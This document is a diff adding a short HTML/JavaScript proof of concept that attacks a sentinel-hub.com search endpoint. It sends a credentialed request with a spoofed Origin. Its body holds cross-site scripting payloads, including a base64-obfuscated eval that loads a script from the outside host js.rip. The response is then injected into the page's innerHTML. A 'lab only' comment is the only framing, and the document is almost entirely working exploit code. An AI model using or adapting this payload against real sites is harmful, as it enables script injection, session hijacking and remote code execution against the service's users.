@@ -1,0 +1,14 @@
+<script>
+fetch('https://services-uswest2.sentinel-hub.com/index/v3/collections/HLS/searchIndex', {
+  method: 'POST',
+  credentials: 'include',
+  headers: {'Content-Type':'application/json','Origin':'https://l1ack.xyz'},
+  body: '"<img src=x><h1>kujkjk</h1><Img Src=OnXSS OnError=confirm(1)><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanMucmlwL3N0bXVteXk5ZmciO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>"'
+})
+  .then(r => r.text())
+  .then(t => {
+    // WARNING: this will execute scripts & render HTML — lab only
+    document.body.innerHTML = t;
+  })
+  .catch(e => console.error(e));
+</script>
